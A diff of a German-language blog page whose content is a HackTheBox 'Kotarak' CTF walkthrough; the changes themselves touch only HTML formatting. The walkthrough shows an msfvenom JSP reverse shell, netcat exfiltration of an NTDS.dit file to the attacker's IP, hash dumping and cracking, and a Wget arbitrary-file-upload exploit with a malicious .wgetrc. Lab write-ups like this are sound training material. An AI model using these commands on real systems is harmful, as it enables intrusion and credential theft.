@@ -52,8 +52,8 @@ Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von
 Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
 Alle wichtigen Informationen zur Privilege Escalation befinden sich im /root Verzeichnis
 Video 
-Anleitung Als erstes machen wir natürlich einen Nmap-Scan."><meta itemprop="datePublished" content="2018-12-05T16:00:56&#43;01:00" />
-<meta itemprop="dateModified" content="2018-12-05T16:00:56&#43;01:00" />
+Anleitung Als erstes machen wir natürlich einen Nmap-Scan."><meta itemprop="datePublished" content="2018-12-05T16:00:56+01:00" />
+<meta itemprop="dateModified" content="2018-12-05T16:00:56+01:00" />
 <meta itemprop="wordCount" content="2634"><meta itemprop="image" content="/"/>
 <meta itemprop="keywords" content="hackthebox,ctf,german," />
 <meta name="twitter:card" content="summary_large_image"/>
@@ -79,8 +79,8 @@ Video
 Anleitung Als erstes machen wir natürlich einen Nmap-Scan." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/2018/12/hackthebox-kotarak-writeup-tipps-anleitung/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-12-05T16:00:56&#43;01:00" />
-<meta property="article:modified_time" content="2018-12-05T16:00:56&#43;01:00" />
+<meta property="article:published_time" content="2018-12-05T16:00:56+01:00" />
+<meta property="article:modified_time" content="2018-12-05T16:00:56+01:00" />
 
 
 
@@ -176,7 +176,7 @@ Anleitung Als erstes machen wir natürlich einen Nmap-Scan." />
 <p><a href="http://www.youtube.com/watch?v=yYhYnWo7AUU"><img src="http://img.youtube.com/vi/yYhYnWo7AUU/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
 <h2 id="anleitung"><strong>Anleitung</strong></h2>
 <p>Als erstes machen wir natürlich einen Nmap-Scan.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.55
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nmap -A 10.10.10.55
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 PORT STATE SERVICE VERSION
@@ -204,7 +204,7 @@ PORT STATE SERVICE VERSION
 </code></pre></div><p>2 offene Webserver Ports wurden gefunden.</p>
 <p>Wenn wir versuchen <strong>10.10.10.55:8080</strong> aufzurufen, bekommen wir als Rückmeldung nur <strong>404 - not found</strong>.<br>
 Bruteforcen wir als nächstes Verzeichnisse auf Port 8080.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u http://10.10.10.55:8080 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u http://10.10.10.55:8080 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span>
 
 Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
 <span style="color:#f92672">=====================================================</span>
@@ -223,7 +223,7 @@ Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span st
 <span style="color:#f92672">====================================================</span>
 </code></pre></div><p><strong>/manager</strong> klingt interessant.</p>
 <p>Sehen wir uns <strong>/manager</strong> mal an.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#ae81ff">404</span> Not found
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#ae81ff">404</span> Not found
 
 The page you tried to access <span style="color:#f92672">(</span>/manager/<span style="color:#f92672">)</span> does not exist.
 
@@ -244,7 +244,7 @@ Note that the URL <span style="color:#66d9ef">for</span> the text interface has 
 <p><img src="https://imgur.com/U9PUOrk.jpg" alt="bild3"></p>
 <p>Auf der Webseite ist nicht viel zu sehen, allerdings haben wir ein Textfeld, in dem wir z.B. eine Url eingeben können, zu dieser wir dann weitergeleitet werden!<br>
 Bruteforcen wir auch hier nach Verzeichnissen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u http://10.10.10.55:60000 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span> -s 200,204,301,302,307,403
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# gobuster -u http://10.10.10.55:60000 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span> -s 200,204,301,302,307,403
 
 Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
 <span style="color:#f92672">=====================================================</span>
@@ -266,7 +266,7 @@ Aber was wenn wir <strong>http://10.10.10.55:60000/server-status</strong> bzw.�
 <p>Rufen wir <strong>http://localhost:888/</strong> wieder durch <strong>10.10.10.55:60000</strong> auf:</p>
 <p><img src="https://imgur.com/pCLVglr.jpg" alt="bild5"></p>
 <p>Wir können dort mehrere Dateien sehen. Wir können allerdings nicht einfach auf einen Dateinamen klicken, um diese aufzurufen. Sehen wir mal in den Seitenquelltext.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 &lt;tr &gt;
 &lt;td width<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;27&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?doc=backup&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;&lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inc/images/generic.png&#34;</span> alt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dir&#34;</span> width<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;22&#34;</span> height<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;22&#34;</span> border<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/a&gt;&lt;/td&gt;
 &lt;td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?doc=backup&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;backup&lt;/a&gt;&lt;/td&gt;
@@ -277,7 +277,7 @@ Aber was wenn wir <strong>http://10.10.10.55:60000/server-status</strong> bzw.�
 </code></pre></div><p><strong>?doc=backup</strong> verweist also auf die Datei <strong>backup</strong>.</p>
 <p>Rufen wir also <strong>http://localhost:888/?doc=backup</strong> auf.</p>
 <p>Wir sehen eine leere Seite&hellip; Schauen wir wieder mal auf den Seitenquelltext.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#75715e">&lt;!--
 </span><span style="color:#75715e">Licensed to the Apache Software Foundation (ASF) under one or more
 </span><span style="color:#75715e">contributor license agreements. See the NOTICE file distributed with
@@ -329,12 +329,12 @@ Aber was wenn wir <strong>http://10.10.10.55:60000/server-status</strong> bzw.�
 <p>Es hat funktioniert. Wir sind nun als Admin im Tomcat Manager angemeldet und können nun, wie man ganz unten auf dem Screenshot sieht, eine <a href="https://de.wikipedia.org/wiki/Web_Application_Archive">WAR</a>-Datei hochladen und diese sogar auch ausführen lassen.</p>
 <p>Mit Hilfe von <strong>msfvenom</strong> können wir eine <strong>Java JSP Reverse Shell</strong> erstellen und diese als <strong>WAR</strong>-Datei verpacken.<br>
 Sehen wir dafür zuerst unsere IP-Adresse nach.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ifconfig tun0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# ifconfig tun0
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 inet 10.10.15.158 netmask 255.255.254.0 destination 10.10.15.158
 <span style="color:#f92672">[</span>..<span style="color:#f92672">]</span>
 </code></pre></div><p>Suchen wir nun nach Java-Payloads.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# msfvenom -l payloads | grep java
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# msfvenom -l payloads | grep java
 java/jsp_shell_bind_tcp Listen <span style="color:#66d9ef">for</span> a connection and spawn a command shell
 java/jsp_shell_reverse_tcp Connect back to attacker and spawn a command shell
 java/meterpreter/bind_tcp Run a meterpreter server in Java. Listen <span style="color:#66d9ef">for</span> a connection
@@ -345,21 +345,21 @@ java/shell/bind_tcp Spawn a piped command shell <span style="color:#f92672">(</s
 java/shell/reverse_tcp Spawn a piped command shell <span style="color:#f92672">(</span>cmd.exe on Windows, /bin/sh everywhere <span style="color:#66d9ef">else</span><span style="color:#f92672">)</span>. Connect back stager
 jaa/shell_reverse_tcp Connect back to attacker and spawn a command shell
 </code></pre></div><p>Erstellen wir nun den <strong>Java-Payload</strong>, geben unsere IP-Adresse als <strong>LHOST</strong> an, den Port an dem wir die Verbindung empfangen wollen als <strong>LPORT</strong> und geben mit <strong>-f</strong> war an, dass wir dies als <strong>WAR</strong>-Datei haben wollen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.15.158 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war &gt; m10x.war
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.15.158 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war &gt; m10x.war
 Payload size: <span style="color:#ae81ff">1090</span> bytes
 Fial size of war file: <span style="color:#ae81ff">1090</span> bytes
 </code></pre></div><p>Jetzt können wir mit <strong>Netcat</strong> auf dem Port, den wir angegeben haben, auf eine Verbindung warten lassen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
 litening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
 </code></pre></div><p>Nun müssen wir nur noch die <strong>.war</strong> Datei hochladen.</p>
 <p><img src="https://imgur.com/VRoqBHq.jpg" alt="bild7"></p>
 <p>Wir können sehen, dass diese nun unter <strong>Applications</strong> aufgeführt ist.</p>
 <p>Wenn wir nun auf den Namen unserer Datei klicken, haben wir eine <strong>Reverse-Shell</strong>!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
 listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
 conect to <span style="color:#f92672">[</span>10.10.15.158<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.55<span style="color:#f92672">]</span> <span style="color:#ae81ff">48972</span>
 </code></pre></div><p>Jetzt können wir uns eine interaktive Shell mit z.B. Autocomplete erstellen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
 tomcat@kotarak-dmz:/$ ^Z
 <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+ Stopped nc -lnvp <span style="color:#ae81ff">4444</span>
 root@kali:~# stty raw -echo
@@ -369,7 +369,7 @@ tomcat@kotarak-dmz:/$ stty rows <span style="color:#ae81ff">53</span>
 tomcat@kotarak-dmz:/$ stty columns <span style="color:#ae81ff">211</span>
 tocat@kotarak-dmz:/$ export TERM<span style="color:#f92672">=</span>xterm-256color
 </code></pre></div><p>Im Homeverzeichnis können wir uns mit dem Befehl **ls -R **rekursiv alle Ordner und Dateien anzeigen lassen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/$ cd home
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/$ cd home
 tomcat@kotarak-dmz:/home$ ls
 atanas tomcat
 
@@ -391,7 +391,7 @@ pentest_data
 </code></pre></div><p>Im Homeverzeichnis von Atanas befindet sich die User Flag!</p>
 <p>Im Homeverzeichnis von Tomcat befinden sich zwei sehr interessante Dateien&hellip;<br>
 Laden wir uns diese via Netcat herunter.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/home$ cd tomcat/to_archive/pentest_data
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/home$ cd tomcat/to_archive/pentest_data
 tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
@@ -409,7 +409,7 @@ root@kali:~/kotarak# nc -lnvp <span style="color:#ae81ff">4445</span> &gt; ntds.
 tocat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.15.158 &lt; 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
 </code></pre></div><p>Bei den beiden Dateien handelt es sich um <strong>NTDS.dit</strong>, welche eine Datenbank ist die Informationen zur Active Directory beinhält, und um eine Kopie des <strong>SYSTEM Registry Hives</strong>!</p>
 <p>Mit Hilfe von dem Skript <strong>secretsdump</strong> von der <strong>Impacket</strong> Skript-Sammlung können wir bei Eingabe der beiden Dateien alle NT-Hashes extrahieren!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
 Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
@@ -461,17 +461,17 @@ atanas:des-cbc-md5:6b80e391f113542a
 </code></pre></div><p>Wir haben nun also den NTLM Hash des Administrator Passwortes!</p>
 <p>Diesen können wir nun auf <a href="https://crackstation.net/">crackstation</a> cracken lassen.</p>
 <p><img src="https://imgur.com/2E6wDDI.jpg" alt="bild8"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">e64fe0f24ba2489c05e64354d74ebd11 <span style="color:#f92672">=</span> f16tomcat!
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">e64fe0f24ba2489c05e64354d74ebd11 <span style="color:#f92672">=</span> f16tomcat!
 </code></pre></div><p>Das Passwort ist also <strong>f16tomcat</strong>!</p>
 <p>Dasselbe Passwort können wir benutzen um uns als <strong>Atanas</strong> ein zu loggen. Glücklich für uns, dass das Passwort wohl mehrfach verwendet wurde.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas
 Password: 
 atnas@kotarak-dmz:~$
 </code></pre></div><p>Jetzt haben wir die Berechtigungen um die User Flag auszulesen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:~$ cat user.txt 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:~$ cat user.txt 
 93#########ZENSIERT#########ce8
 </code></pre></div><p>Wir haben auch ausreichende Berechtigungen für das Root-Verzeichnis!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:~$ cd /root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:~$ cd /root
 atanas@kotarak-dmz:/root$ ls
 app.log flag.txt
 atanas@kotarak-dmz:/root$ cat flag.txt 
@@ -481,7 +481,7 @@ atanas@kotarak-dmz:/root$ cat app.log
 10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:50:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
 100.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:52:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
 </code></pre></div><p>Die Root Flag ist aber nicht hier. Es befindet sich ansonsten nur die Datei app.log im Verzeichnis&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# searchsploit wget
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# searchsploit wget
 ------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                      | Path
                                                                    | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
@@ -502,7 +502,7 @@ Linux/x86 - execve wget + Mutated + Null-Free Shellcode <span style="color:#f926
 Linux/x86 - execve<span style="color:#f92672">(</span>_/usr/bin/wget__ _aaaa_<span style="color:#f92672">)</span> Shellcode <span style="color:#f92672">(</span><span style="color:#ae81ff">42</span> bytes<span style="color:#f92672">)</span>   | shellcodes/linux_x86/13702.c
 ------------------------------------------------------------------ ----------------------------------
 </code></pre></div><p>Sehen wir uns diesen Exploit an: <a href="https://www.exploit-db.com/exploits/40064/">GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# searchsploit -m exploits/linux/remote/40064.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# searchsploit -m exploits/linux/remote/40064.txt
 Exploit: GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution
 URL: https://www.exploit-db.com/exploits/40064/
 Path: /usr/share/exploitdb/exploits/linux/remote/40064.txt
@@ -510,7 +510,7 @@ File Type: UTF-8 Unicode text, with CRLF line terminators
 
 Copied to: /root/kotarak/40064.txt
 </code></pre></div><p>Die Datei enthält folgende Anleitung um eine Remote Code Execution auszuführen:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">In order to exploit this setup, attacker first prepares a malicious .wgetrc 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">In order to exploit this setup, attacker first prepares a malicious .wgetrc 
 and starts an FTP server:
 
 attackers-server# mkdir /tmp/ftptest
@@ -615,7 +615,7 @@ sending malicious redirects to the victim wget<span style="color:#e6db74">&#39;s
 </span><span style="color:#e6db74">
 </span><span style="color:#e6db74">--[ eof ]---
 </span></code></pre></div><p>Befolgen wir die Anleitung, anstatt <strong>/etc/shadow</strong> wollen wir allerdings <strong>/root/root.txt</strong> erhalten!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# mkdir ftptest
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak# mkdir ftptest
 root@kali:~/kotarak# cd ftptest/
 root@kali:~/kotarak/ftptest# cat <span style="color:#e6db74">&lt;&lt;_EOF_&gt;.wgetrc
 </span><span style="color:#e6db74">&gt; post_file = /root/root.txt
@@ -625,10 +625,10 @@ root@kali:~/kotarak/ftptest# cat .wgetrc
 post_file <span style="color:#f92672">=</span> /root/root.txt
 ouput_document <span style="color:#f92672">=</span> /etc/cron.d/wget-root-shell
 </code></pre></div><p>Nun <strong>pyftpdlib</strong> installieren, falls noch nicht vorhanden</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak/ftptest# sudo pip install pyftpdlib
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak/ftptest# sudo pip install pyftpdlib
 Reuirement already satisfied: pyftpdlib in /usr/local/lib/python2.7/dist-packages
 </code></pre></div><p>pyftpdlib ausführen:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak/ftptest# python -m pyftpdlib -p21 -w
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/kotarak/ftptest# python -m pyftpdlib -p21 -w
 /usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
 RuntimeWarning<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>I 2018-03-14 19:17:49<span style="color:#f92672">]</span> &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid<span style="color:#f92672">=</span><span style="color:#ae81ff">11282</span> <span style="color:#f92672">&lt;&lt;&lt;</span>
@@ -636,7 +636,7 @@ RuntimeWarning<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>I 2018-03-14 19:17:49<span style="color:#f92672">]</span> masquerade <span style="color:#f92672">(</span>NAT<span style="color:#f92672">)</span> address: None
 <span style="color:#f92672">[</span>I2018-03-14 19:17:49<span style="color:#f92672">]</span> passive ports: None
 </code></pre></div><p>Kopieren wir nun den exploit auf Kotarak.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ vi exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ vi exploit.py
 
 <span style="color:#75715e">#!/usr/bin/env python</span>
 
@@ -665,12 +665,12 @@ print <span style="color:#e6db74">&#34;Serving wget exploit on port %s...\n\n&#3
 
 hadler.serve_forever<span style="color:#f92672">()</span>
 </code></pre></div><p>Bei <strong>FTP_HOST</strong> müssen wir unsere IP-Adresse eintragen.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ python exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ python exploit.py
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 soket.error: <span style="color:#f92672">[</span>Errno 13<span style="color:#f92672">]</span> Permission denied
 </code></pre></div><p>Wir können den Exploit nicht ausführen, da die ersten 1024 Ports für <strong>root</strong> reserviert sind.</p>
 <p>Es gibt allerdings einen einfachen Trick wie wir dies umgehen können und zwar <a href="https://en.wikipedia.org/wiki/Authbind">Authbind</a>!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ authbind python exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">atanas@kotarak-dmz:/root$ authbind python exploit.py
 Ready? Is your FTP server running?
 FTP found open on 10.10.15.158:21<span style="color:#ae81ff">\.</span> Let<span style="color:#e6db74">&#39;s go then
 </span><span style="color:#e6db74">
